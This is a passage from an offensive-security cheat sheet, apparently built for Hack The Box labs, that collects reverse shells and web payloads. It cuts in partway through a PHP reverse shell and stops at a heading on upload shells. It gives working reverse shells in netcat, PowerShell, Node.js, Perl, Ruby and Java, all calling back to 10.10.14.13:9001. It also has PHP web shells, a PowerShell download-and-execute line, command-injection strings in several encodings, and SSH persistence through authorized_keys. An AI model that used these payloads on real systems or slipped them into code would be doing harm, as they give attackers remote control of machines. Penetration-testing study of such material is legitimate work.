</span></span><span class="line"><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nx">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">printit</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$daemon</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">print</span> <span class="s2">&#34;</span><span class="si">$string\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><h3 id="php-command-execution">PHP Command Execution</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># Simple PHP command execution
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"># More advanced web shell
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php 
</span></span></span><span class="line"><span class="cl"><span class="err">if(isset($_GET[&#39;cmd&#39;])) {
</span></span></span><span class="line"><span class="cl"><span class="err">    echo &#34;&lt;pre&gt;&#34; . shell_exec($_GET[&#39;cmd&#39;]) . &#34;&lt;/pre&gt;&#34;;
</span></span></span><span class="line"><span class="cl"><span class="err">}
</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"># POST request shell
</span></span></span><span class="line"><span class="cl"><span class="err"># POST /shell.php
</span></span></span><span class="line"><span class="cl"><span class="err"># cmd=bash -c &#39;bash -i /dev/tcp/10.10.14.13/9001 0&gt;&amp;1&#39;
</span></span></span></code></pre></div><hr>
<h2 id="netcat-reverse-shells">Netcat Reverse Shells</h2>
<h3 id="traditional-netcat">Traditional Netcat</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Basic netcat reverse shell</span>
</span></span><span class="line"><span class="cl">nc -e /bin/sh 10.10.14.13 <span class="m">9001</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Alternative if -e is not available</span>
</span></span><span class="line"><span class="cl">rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc 10.10.14.13 <span class="m">9001</span> &gt;/tmp/f
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Using ncat (Nmap&#39;s netcat)</span>
</span></span><span class="line"><span class="cl">ncat 10.10.14.13 <span class="m">9001</span> -e /bin/bash
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># OpenBSD netcat</span>
</span></span><span class="line"><span class="cl">nc 10.10.14.13 <span class="m">9001</span> -e /bin/sh
</span></span></code></pre></div><h3 id="advanced-netcat">Advanced Netcat</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Netcat with PTY</span>
</span></span><span class="line"><span class="cl">nc -e /bin/bash 10.10.14.13 <span class="m">9001</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Netcat persistent shell</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> true<span class="p">;</span> <span class="k">do</span> nc -e /bin/bash 10.10.14.13 9001<span class="p">;</span> sleep 60<span class="p">;</span> <span class="k">done</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># UDP reverse shell</span>
</span></span><span class="line"><span class="cl">nc -u 10.10.14.13 <span class="m">9001</span> -e /bin/bash
</span></span></code></pre></div><hr>
<h2 id="powershell-reverse-shells-windows">PowerShell Reverse Shells (Windows)</h2>
<h3 id="basic-powershell">Basic PowerShell</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Simple PowerShell reverse shell</span>
</span></span><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-c</span> <span class="s2">&#34;</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.13&#39;,9001);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Base64 encoded PowerShell</span>
</span></span><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-enc</span> <span class="p">&lt;</span><span class="n">base64_encoded_command</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Download and execute</span>
</span></span><span class="line"><span class="cl"><span class="n">powershell</span> <span class="s2">&#34;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.13/shell.ps1&#39;)&#34;</span>
</span></span></code></pre></div><h3 id="advanced-powershell">Advanced PowerShell</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># PowerShell with authentication bypass</span>
</span></span><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="o">-File</span> <span class="n">shell</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># PowerShell one-liner (formatted)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Net</span><span class="p">.</span><span class="py">Sockets</span><span class="p">.</span><span class="py">TCPClient</span><span class="p">(</span><span class="s2">&#34;10.10.14.13&#34;</span><span class="p">,</span><span class="mf">9001</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="py">GetStream</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">byte[]</span><span class="p">]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="mf">0</span><span class="p">.</span><span class="mf">.65535</span><span class="p">|%{</span><span class="mf">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="py">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="mf">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="py">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="mf">2</span><span class="p">&gt;&amp;</span><span class="mf">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s2">&#34;PS &#34;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="py">Path</span> <span class="p">+</span> <span class="s2">&#34;&gt; &#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">([</span><span class="no">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">).</span><span class="py">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$stream</span><span class="p">.</span><span class="py">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$stream</span><span class="p">.</span><span class="py">Flush</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="nv">$client</span><span class="p">.</span><span class="py">Close</span><span class="p">()</span>
</span></span></code></pre></div><hr>
<h2 id="nodejs-reverse-shells">Node.js Reverse Shells</h2>
<h3 id="basic-nodejs">Basic Node.js</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">Simple</span> <span class="nx">Node</span><span class="p">.</span><span class="nx">js</span> <span class="nx">reverse</span> <span class="nx">shell</span>
</span></span><span class="line"><span class="cl"><span class="nx">node</span> <span class="o">-</span><span class="nx">e</span> <span class="s2">&#34;require(&#39;child_process&#39;).exec(&#39;nc -e /bin/sh 10.10.14.13 9001&#39;)&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">Pure</span> <span class="nx">Node</span><span class="p">.</span><span class="nx">js</span> <span class="nx">implementation</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;net&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">cp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">sh</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="p">[]);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mi">9001</span><span class="p">,</span> <span class="s2">&#34;10.10.14.13&#34;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sr">/a/</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">})();</span>
</span></span></code></pre></div><hr>
<h2 id="other-language-shells">Other Language Shells</h2>
<h3 id="perl">Perl</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"><span class="c1"># Perl reverse shell</span>
</span></span><span class="line"><span class="cl"><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;use Socket;$i=&#34;10.10.14.13&#34;;$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Alternative Perl</span>
</span></span><span class="line"><span class="cl"><span class="n">perl</span> <span class="o">-</span><span class="n">MIO</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;10.10.14.13:9001&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
</span></span></code></pre></div><h3 id="ruby">Ruby</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="c1"># Ruby reverse shell</span>
</span></span><span class="line"><span class="cl"><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;f=TCPSocket.open(&#34;10.10.14.13&#34;,9001).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Alternative Ruby</span>
</span></span><span class="line"><span class="cl"><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;exit if fork;c=TCPSocket.new(&#34;10.10.14.13&#34;,&#34;9001&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;</span>
</span></span></code></pre></div><h3 id="java">Java</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="w"> </span><span class="n">Java</span><span class="w"> </span><span class="n">reverse</span><span class="w"> </span><span class="n">shell</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ReverseShell</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Socket</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Socket</span><span class="p">(</span><span class="s">&#34;10.10.14.13&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">9001</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Process</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InputStream</span><span class="w"> </span><span class="n">pi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InputStream</span><span class="w"> </span><span class="n">pe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="na">getErrorStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InputStream</span><span class="w"> </span><span class="n">si</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">OutputStream</span><span class="w"> </span><span class="n">po</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">OutputStream</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">s</span><span class="p">.</span><span class="na">isClosed</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">while</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">&gt;</span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="n">so</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">while</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">&gt;</span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="n">so</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">while</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">&gt;</span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="n">po</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">so</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">po</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Thread</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="n">50</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">p</span><span class="p">.</span><span class="na">exitValue</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">p</span><span class="p">.</span><span class="na">destroy</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">s</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><hr>
<h2 id="shell-stabilization">Shell Stabilization</h2>
<h3 id="tty-upgrade">TTY Upgrade</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Python PTY</span>
</span></span><span class="line"><span class="cl">python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Background the shell</span>
</span></span><span class="line"><span class="cl">CTRL + Z
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set raw mode and foreground</span>
</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set terminal environment</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Check screen size and set</span>
</span></span><span class="line"><span class="cl">stty -a 
</span></span><span class="line"><span class="cl">stty rows <span class="m">28</span> cols <span class="m">110</span>
</span></span></code></pre></div><h3 id="alternative-tty-methods">Alternative TTY Methods</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Using script</span>
</span></span><span class="line"><span class="cl">script -qc /bin/bash /dev/null
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Using socat (if available on target)</span>
</span></span><span class="line"><span class="cl">socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:10.10.14.13:9001
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Using expect</span>
</span></span><span class="line"><span class="cl">expect -c <span class="s2">&#34;spawn /bin/bash; interact&#34;</span>
</span></span></code></pre></div><hr>
<h2 id="ssh-based-access">SSH-Based Access</h2>
<h3 id="sshpass-for-automated-ssh-login">sshpass for Automated SSH Login</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Install sshpass</span>
</span></span><span class="line"><span class="cl">sudo apt install sshpass
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># SSH with password (from extracted credentials)</span>
</span></span><span class="line"><span class="cl">sshpass -p <span class="s1">&#39;PlayerOftheMatch2022&#39;</span> ssh player@10.10.11.194
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># SSH with password from file</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;password123&#39;</span> &gt; /tmp/pass
</span></span><span class="line"><span class="cl">sshpass -f /tmp/pass ssh user@target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># SSH with password and command execution</span>
</span></span><span class="line"><span class="cl">sshpass -p <span class="s1">&#39;password&#39;</span> ssh user@target <span class="s1">&#39;whoami&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Disable host key checking for testing</span>
</span></span><span class="line"><span class="cl">sshpass -p <span class="s1">&#39;password&#39;</span> ssh -o <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no user@target
</span></span></code></pre></div><h3 id="ssh-key-based-access">SSH Key-Based Access</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Use existing private key</span>
</span></span><span class="line"><span class="cl">ssh -i /path/to/private_key user@target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># SSH with specific key and no host checking</span>
</span></span><span class="line"><span class="cl">ssh -i /path/to/key -o <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no user@target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Generate SSH key pair for persistence</span>
</span></span><span class="line"><span class="cl">ssh-keygen -t rsa -f /tmp/key -N <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Copy public key to target (if possible)</span>
</span></span><span class="line"><span class="cl">cat /tmp/key.pub &gt;&gt; ~/.ssh/authorized_keys
</span></span></code></pre></div><h3 id="shell-enhancement">Shell Enhancement</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Set environment variables</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>/bin/bash
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">HOME</span><span class="o">=</span>/tmp
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Enable command history</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">HISTFILE</span><span class="o">=</span>/tmp/.bash_history
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Color prompt</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PS1</span><span class="o">=</span><span class="s1">&#39;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39;</span>
</span></span></code></pre></div><hr>
<h2 id="web-application-payloads">Web Application Payloads</h2>
<h3 id="command-injection-in-web-forms">Command Injection in Web Forms</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Basic command injection</span>
</span></span><span class="line"><span class="cl"><span class="p">;</span> bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.13/9001 0&gt;<span class="p">&amp;</span><span class="m">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># URL encoded</span>
</span></span><span class="line"><span class="cl">%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F9001%200%3E%261
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># In JSON</span>
</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;cmd&#34;</span>: <span class="s2">&#34;; bash -i &gt;&amp; /dev/tcp/10.10.14.13/9001 0&gt;&amp;1&#34;</span><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># As POST parameter</span>
</span></span><span class="line"><span class="cl"><span class="nv">cmd</span><span class="o">=</span>bash -c <span class="s1">&#39;bash -i /dev/tcp/10.10.14.13/9001 0&gt;&amp;1&#39;</span>
</span></span></code></pre></div><h3 id="file-upload-shells">File Upload Shells</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># Simple PHP upload shell
